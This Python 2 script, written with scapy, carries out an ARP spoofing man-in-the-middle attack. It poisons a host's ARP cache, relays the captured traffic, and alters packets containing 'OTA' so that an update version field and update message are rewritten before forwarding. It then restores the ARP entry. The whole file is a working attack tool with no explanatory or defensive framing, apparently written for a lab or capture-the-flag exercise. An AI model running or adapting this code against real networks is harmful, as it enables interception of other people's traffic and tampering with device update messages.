from scapy.all import *
import sys

BLOADCASTMAC = "ff:ff:ff:ff:ff:ff"
UNKNOWNMAC = "00:00:00:00:00:00"

InterFace = sys.argv[1]
SenderIp = sys.argv[2]
TargetIp = sys.argv[3]

print "arp spoofing " + sys.argv[2] + " to " + sys.argv[3] + " start!!"

MyMac = get_if_hwaddr(InterFace)
MyIp = get_if_addr(InterFace)

print "My Mac Addr is " + MyMac

def findMacAddr():
    global SenderMac
    #arppkt = Ether(dst = BLOADCASTMAC, src = MyMac)/ARP(op=ARP.who_has, hwsrc=MyMac, psrc=MyIp, hwdst=UNKNOWNMAC, pdst=SenderIp)
    #p = srp1(arppkt, iface=InterFace)

    p = arping(SenderIp, iface = InterFace)
    rep = p[0][0][1]
    SenderMac = rep[ARP].hwsrc

    global TargetMac
    p = arping(TargetIp, iface = InterFace)
    rep = p[0][0][1]
    TargetMac = rep[ARP].hwsrc

    print "Sender Mac Addr is " + SenderMac
    print "Target Mac Addr is " + TargetMac

def poison(sIp, tIp, sMac):
    arppkt = Ether(dst = sMac, src = MyMac)/ARP(op=ARP.is_at, hwsrc=MyMac, psrc=tIp, hwdst=sMac, pdst=sIp)
    sendp(arppkt, iface=InterFace)

def poison_bidirect(sIp, tIp, sMac, tMac):
    poison(sIp, tIp, sMac)
    poison(tIp, sIp, tMac)

def chk_pkt(pkt):
    if pkt[Ether].src != SenderMac:
        return 0
    if pkt[Ether].type == 0x800:
        if pkt[IP].dst == MyIp:
            return 0
    return 1

def repair(sIp, tIp, sMac, tMac):
    print "repair"
    arppkt = Ether(dst = sMac, src = MyMac)/ARP(op=ARP.is_at, hwsrc=tMac, psrc=tIp, hwdst=sMac, pdst=sIp)
    sendp(arppkt, iface=InterFace)


def cb(pkt):
    flag = chk_pkt(pkt)
    if flag == 1:       # relay
        new_pkt = pkt
        new_pkt[Ether].dst = TargetMac
        new_pkt[Ether].src = MyMac
        if "OTA" in str(pkt):
            #pkt.show2()
            befLen = len(pkt)
            new_pkt[Raw].load = new_pkt[Raw].load.replace("Version=\'UFI22\'", "Version=\'UFI33\'")
            new_pkt[Raw].load = new_pkt[Raw].load.replace("UpdateMessage=\'.\'", "UpdateMessage=\'PizzaSch001\'")
            del new_pkt[IP].chksum
            new_pkt[IP].len += len(new_pkt) - befLen
            del new_pkt[TCP].chksum
            repair(SenderIp, TargetIp, SenderMac, TargetMac)
            new_pkt.show2()
            sendp(new_pkt, iface=InterFace)
            sys.exit(0)
        sendp(new_pkt, iface=InterFace)
        poison(SenderIp, TargetIp, SenderMac)
    elif flag == 2:     # poison
        poison(SenderIp, TargetIp, SenderMac)



findMacAddr()

repair(SenderIp, TargetIp, SenderMac, TargetMac)
raw_input(">")
#poison_bidirect(SenderIp, TargetIp, SenderMac, TargetMac)
poison(SenderIp, TargetIp, SenderMac)
#raw_input(">")
#repair(SenderIp, TargetIp, SenderMac, TargetMac)
sniff(iface=InterFace, prn=cb)
